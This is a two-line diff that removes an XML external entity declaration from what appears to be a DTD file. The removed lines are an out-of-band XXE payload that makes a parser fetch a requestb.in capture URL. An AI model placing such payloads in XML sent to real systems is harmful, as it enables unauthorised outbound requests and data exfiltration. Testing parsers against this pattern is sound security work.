@@ -1,2 +1,0 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://requestb.in/1h73dgm1?p=qwe'>">
-  %all;
